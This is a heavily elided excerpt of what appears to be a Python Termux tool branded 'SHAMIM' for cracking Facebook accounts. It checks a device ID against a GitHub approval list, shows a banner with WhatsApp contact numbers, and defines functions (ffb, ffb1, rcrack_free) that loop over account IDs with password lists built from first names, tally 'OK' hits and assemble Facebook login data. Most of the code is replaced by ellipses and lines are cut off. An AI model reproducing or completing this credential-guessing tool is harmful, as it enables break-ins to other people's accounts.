#SPY(SAT SHAMIM YT)(HASAN. SARKAR)
#WhatsApp : 0500452461
#Github : Shamim1BD
from os import path
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get(f'https://github.com/Shamim1BD/SP/blob/main/Afroveal4.txt').text
...
███████ ██   ██ ██   ██ ██      ██ ██ ██      ██ 
  ...
  os.system(f'https://www.facebook.com/profile.php?id=100094405748780')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get(f"https://github.com/Shamim1BD/SP/blob/main/Afroveal4.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+966500452461?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
:......:::..:::::..::..:::::..::........::........::..:::::..::
    ...
    ┌───────────────────────────────────────┐
     ...
     [✓] WHATSAPP : +966500452461
     [✓] VERSION  : 9.2                    
     [✓] POWER BY : \033[1;32m SHAMIM TERMUX \033[1;37m            
    └───────────────────────────────────────┘""")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [SHAMIM-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [SHAMIM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Shamim, Hasan, Sarkar ')
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			free_fb = session.get('https://www.facebook.com/profile.php?id=100094405748780').text
			log_data = {
